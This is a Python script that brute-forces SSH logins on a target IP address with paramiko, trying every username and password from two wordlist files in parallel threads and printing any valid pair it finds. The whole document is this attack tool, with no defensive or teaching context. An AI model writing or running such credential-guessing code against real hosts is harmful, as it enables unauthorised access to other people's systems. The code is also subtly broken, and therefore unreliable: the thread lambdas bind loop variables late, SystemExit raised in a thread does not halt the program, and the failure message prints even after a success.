import paramiko
import threading

def ssh_login(username_file, password_file, ip_address):
    try:
        # Open the username file and read the usernames into a list
        with open(username_file, 'r') as f:
            usernames = [line.strip() for line in f]

        # Open the password file and read the passwords into a list
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError as e:
        print(f"Error opening file: {e}")
        return

    threads = []
    for username in usernames:
        for password in passwords:
            print(f"Trying username={username} and password={password}")
            t = threading.Thread(target=lambda: check_credentials(ip_address, username, password))
            threads.append(t)
            t.start()
    
    for t in threads:
        t.join()

    print("No valid credentials found")
    
def check_credentials(ip_address, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip_address, username=username, password=password, banner_timeout=5)
    except paramiko.ssh_exception.AuthenticationException:
        return
    except Exception as e:
        print(f"Error while connecting to {ip_address} with username {username} and password {password}: {e}")
        return
    else:
        print(f"Valid credentials found: username={username}, password={password}")
        ssh.close()
        raise SystemExit
